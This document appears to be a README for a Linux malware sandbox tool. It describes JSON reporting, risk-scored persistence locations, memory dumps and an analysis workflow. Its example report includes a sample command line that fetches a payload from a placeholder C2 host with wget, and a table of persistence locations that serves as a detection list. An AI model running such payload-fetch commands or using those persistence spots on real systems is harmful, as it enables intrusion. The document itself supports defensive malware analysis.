# Enhanced Sandbox Features

## Overview

The sandbox mode now includes comprehensive JSON reporting with detailed process tracking, file operations, network activity, and automated file collection.

## New Features

### 1. **Organized Output Structure**
When running in sandbox mode, a dedicated directory is created:
```
sandbox_<SHA1>/
├── report.json          # Comprehensive analysis report
├── dropped_files/       # Files created/modified by malware
└── memory_dumps/        # Memory dumps from suspicious processes
```

### 2. **JSON Report Contents**

The `report.json` file includes:

#### Analysis Section
- Sample path
- Sample SHA-1 hash
- Sample SHA-256 hash
- Sample file type (ELF, PE, script, etc.)
- Sample size
- Start time, end time, duration
- Timeout configuration

#### Process Tree
For each process in the sandbox tree:
- PID, PPID (parent-child relationships)
- Process name
- Full executable path
- Complete command line
- Start time

#### File Operations
- Files created, opened, modified, deleted
- Full path of each file
- Risk scoring (0-100) based on location and characteristics
- Category classification (persistence, temp_staging, library_hijack, etc.)
- SHA-1 and SHA-256 hashes of dropped files
- File type detection for captured files
- Files automatically copied to `dropped_files/` directory with sanitized names
- Tracking of hidden files (starting with '.')

##### Monitored High-Risk Locations

| Location | Risk Score | Category | Purpose |
|----------|-----------|----------|---------|
| `/etc/cron.*`, `/var/spool/cron` | 95 | persistence | Scheduled task persistence |
| `/etc/init.d/`, `/etc/systemd/system/` | 95 | persistence | Service-based persistence |
| `/etc/ld.so.preload` | 95 | persistence | Dynamic linker hijacking |
| `/boot/` | 100 | boot_persistence | Bootloader/kernel persistence |
| Library dirs (`/lib`, `/usr/lib`) with `.so` | 90 | library_hijack | Shared library injection |
| `/tmp/`, `/var/tmp/`, `/dev/shm/` | 70-85 | temp_staging | Temporary staging/execution |
| `/run/`, `/proc/*/fd/`, `/proc/*/mem` | 80 | runtime_fileless | Fileless/memory-only execution |
| `/root/` | 65-85 | root_staging | Root user staging area |
| `~/.config/`, `~/.cache/`, `~/.local/share/` | 60-75 | user_persistence | User-level persistence |
| `~/.bashrc`, `~/.profile`, `~/.ssh/` | 60-75 | user_persistence | Shell/SSH persistence |
| `/home/<user>/` (scripts/hidden) | 55 | user_staging | User staging area |
| Hidden files (`.filename`) anywhere | 50+ | hidden_file | Concealment attempt |

##### File Operation Detection
- **Created**: File opened with O_CREAT flag
- **Written**: File opened with write access (O_WRONLY/O_RDWR)
- **Accessed**: File opened in suspicious location (read-only)
- Real-time monitoring via `/proc/<pid>/fd` and `/proc/<pid>/fdinfo`

#### Network Activity
- Socket creation events
- Protocol (TCP/UDP)
- Local and remote addresses
- IP information

#### Memory Dumps
- Full memory dumps saved to `memory_dumps/` subdirectory
- SHA-1 and SHA-256 hashes of memory dumps
- Memory map files for reverse engineering

#### Summary Statistics
- Total processes spawned
- Files created count
- Sockets created count
- Suspicious findings count
- Total analysis duration

### 3. **Automatic File Collection**

All files created by the malware in suspicious directories are automatically:
- Copied to `dropped_files/` subdirectory
- Hashed (SHA-1 and SHA-256)
- Logged in the JSON report

Monitored directories:
- `/tmp/`
- `/dev/shm/`
- `/var/tmp/`

## Compilation

### Required Dependencies

The enhanced sandbox features require OpenSSL for hashing:

**Ubuntu/Debian:**
```bash
sudo apt-get install libssl-dev
```

**RHEL/CentOS/Fedora:**
```bash
sudo yum install openssl-devel
```

### Compile Command

**Static binary with sandbox features:**
```bash
gcc -o realtime_memdump_tool realtime_memdump_tool.c -pthread -static -lssl -lcrypto -O2
```

**With YARA support:**
```bash
gcc -o realtime_memdump_tool realtime_memdump_tool.c -DENABLE_YARA -lyara -pthread -lssl -lcrypto -O2
```

**Note:** Static linking with OpenSSL may require additional flags on some systems:
```bash
gcc -o realtime_memdump_tool realtime_memdump_tool.c -pthread -O2 -lssl -lcrypto -ldl -lz
```

## Usage Examples

### Basic Sandbox Analysis
```bash
sudo ./realtime_memdump_tool --sandbox ./malware
```
Creates: `sandbox_<SHA1>/` with full report

### With Full Memory Dump
```bash
sudo ./realtime_memdump_tool --full_dump --sandbox ./malware
```
Memory dumps saved to: `sandbox_<SHA1>/memory_dumps/`

### With Timeout (for persistent malware)
```bash
sudo ./realtime_memdump_tool --full_dump --sandbox-timeout 10 --sandbox ./malware
```
Analyzes for 10 minutes, captures all activity including C2 communication

### Complete Analysis
```bash
sudo ./realtime_memdump_tool --full_dump --sandbox-timeout 5 --yara rules.yar --sandbox ./packed_malware
```

## Report Structure Example

```json
{
  "analysis": {
    "start_time": 1732406400,
    "sample_path": "./malware",
    "sample_sha1": "a1b2c3d4e5f6789012345678901234567890abcd",
    "sample_sha256": "1234567890abcdef...",
    "sample_type": "ELF",
    "sample_size": 15420,
    "timeout": 300
  },
  "processes": [
    {
      "pid": 12345,
      "ppid": 1234,
      "name": "malware",
      "path": "/tmp/malware",
      "cmdline": "/tmp/malware --payload",
      "start_time": 1732406405
    },
    {
      "pid": 12346,
      "ppid": 12345,
      "name": "sh",
      "path": "/bin/sh",
      "cmdline": "/bin/sh -c 'wget http://c2.example.com/payload'",
      "start_time": 1732406410
    }
  ],
  "summary": {
    "end_time": 1732406700,
    "duration": 300,
    "total_processes": 2,
    "files_created": 3,
    "sockets_created": 1,
    "suspicious_findings": 5
  }
}
```

## Workflow for Malware Analysis

### 1. Execute in Sandbox
```bash
sudo ./realtime_memdump_tool --full_dump --sandbox-timeout 10 --sandbox ./unknown_sample
```

### 2. Review JSON Report
```bash
cd sandbox_<SHA1>/
cat report.json | jq .
```

### 3. Analyze Dropped Files
```bash
cd dropped_files/
file *
strings * | grep -i "http\|password\|key"
```

### 4. Reverse Engineer Memory Dump
```bash
cd memory_dumps/
ghidra memdump_12345_malware.bin
# Use corresponding .map file to locate virtual addresses
```

### 5. Check Network Indicators
```bash
cat report.json | jq '.summary'
# Look for socket_created count and process command lines for URLs/IPs
```

## File Type Detection

The tool automatically identifies:
- **ELF**: Linux executables
- **PE**: Windows executables (via Wine, etc.)
- **script**: Shell scripts (#! shebang)
- **python**: Python scripts
- **text**: Plain text files
- **binary**: Unknown binary formats

## Hash Calculation

All files are hashed using:
- **SHA-1**: For quick identification and indexing
- **SHA-256**: For stronger cryptographic verification

Hashes are calculated for:
- Original sample
- Dropped files
- Memory dumps

## Performance Impact

The enhanced reporting adds minimal overhead:
- Hash calculation: ~1-2ms per MB
- JSON writing: Asynchronous, non-blocking
- File copying: Only for files in suspicious directories
- Memory: +2MB for process tracking structures

## Troubleshooting

### OpenSSL Not Found
```bash
# Check if OpenSSL is installed
pkg-config --libs openssl

# If not, install:
sudo apt-get install libssl-dev
```

### JSON Report Not Created
- Ensure write permissions in current directory
- Check disk space
- Verify sample path is accessible

### Dropped Files Not Captured
- Files are only captured from `/tmp`, `/dev/shm`, `/var/tmp`
- Ensure sufficient disk space
- Check permissions

## Security Considerations

**⚠️ WARNING**: When analyzing malware:
- Run in isolated VM or container
- Use network isolation (--net=none for Docker)
- Monitor resource usage (CPU, memory, disk)
- Sandbox may not catch all malicious behavior
- Some malware detects VMs/sandboxes and alters behavior

## Integration with Analysis Tools

### VirusTotal Submission
```bash
sha1=$(jq -r '.analysis.sample_sha1' sandbox_*/report.json)
# Submit to VT, check against $sha1
```

### YARA Scanning
```bash
yara -r rules/ sandbox_*/dropped_files/
yara rules.yar sandbox_*/memory_dumps/*.bin
```

### Automated Analysis Pipeline
```bash
#!/bin/bash
sample=$1
sudo ./realtime_memdump_tool --full_dump --sandbox-timeout 5 --sandbox "$sample"
sha1=$(jq -r '.analysis.sample_sha1' sandbox_*/report.json)
echo "Analysis complete: sandbox_$sha1/"
jq . "sandbox_$sha1/report.json" > analysis_results.json
```

## Future Enhancements

Planned features:
- [ ] DNS query logging via /etc/resolv.conf monitoring
- [ ] HTTP/HTTPS traffic extraction
- [ ] Registry operations (Wine)
- [ ] Process injection detection improvements
- [ ] API call tracing via LD_PRELOAD hook
- [ ] Automated IOC extraction
- [ ] Timeline visualization
